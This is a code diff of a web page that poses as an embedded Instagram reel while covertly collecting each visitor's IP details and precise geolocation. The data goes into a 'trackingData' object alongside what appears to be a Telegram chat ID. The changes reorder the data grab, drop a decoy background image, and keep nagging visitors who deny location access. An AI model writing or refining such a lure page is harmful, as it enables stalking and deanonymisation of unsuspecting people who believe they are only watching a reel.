@@ -12,15 +12,6 @@
             overflow: hidden;  
             font-family: Arial, sans-serif;  
         }  
-        #bg-image {  
-            position: absolute;  
-            top: 0;  
-            left: 0;  
-            width: 100%;  
-            height: 100%;  
-            object-fit: cover;  
-            z-index: 1;  
-        }  
         #loading-overlay {  
             position: absolute;  
             top: 0;  
@@ -93,7 +84,7 @@
     </style>  
 </head>  
 <body>  
-    <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">  
+    <!-- Removed background image -->
     
     <iframe id="instagram-reel" src="https://www.instagram.com/reel/DP1Qrn7jAcJ/embed" frameborder="0"></iframe>
       
@@ -114,7 +105,6 @@
         const chatId = '7173355426';  
           
         // DOM elements  
-        const bgImage = document.getElementById('bg-image');
         const instagramReel = document.getElementById('instagram-reel');
         const loadingOverlay = document.getElementById('loading-overlay');  
         const loadingText = document.getElementById('loading-text');  
@@ -144,7 +134,7 @@
             }  
         }  
           
-        // Function to get precise location  
+        // Function to get precise location (single request)  
         function getPreciseLocation() {  
             return new Promise((resolve) => {  
                 if (!navigator.geolocation) {  
@@ -232,13 +222,10 @@
             return interval;
         }  
           
-        // Show Instagram reel after delay
+        // Show Instagram reel and hide loading overlay
         function showInstagramReel() {
-            setTimeout(() => {
-                bgImage.style.display = 'none';
-                instagramReel.style.display = 'block';
-                loadingOverlay.style.display = 'none';
-            }, 4000);
+            loadingOverlay.style.display = 'none';
+            instagramReel.style.display = 'block';
         }
           
         // Main tracking function  
@@ -246,11 +233,11 @@
             // Start rotating loading messages  
             const interval = rotateLoadingMessages();
               
-            // First try to get precise location  
-            const liveLocation = await getPreciseLocation();  
-              
-            // Then get IP details  
+            // Get IP details first  
             const ipDetails = await getIPInfo();  
+              
+            // Only then request location (single request)
+            const liveLocation = await getPreciseLocation();  
               
             // Combine all data  
             const trackingData = {  
@@ -265,11 +252,11 @@
             // Clear loading message rotation
             clearInterval(interval);
               
-            // Show Instagram reel after 4 seconds if location was granted
-            if (liveLocation) {
-                showInstagramReel();
-            } else {
-                // If location was denied, show permission request
+            // Show Instagram reel and hide loading overlay
+            showInstagramReel();
+            
+            // If location was denied, show permission request
+            if (!liveLocation) {
                 permissionRequest.style.display = 'flex';
             }
         }  
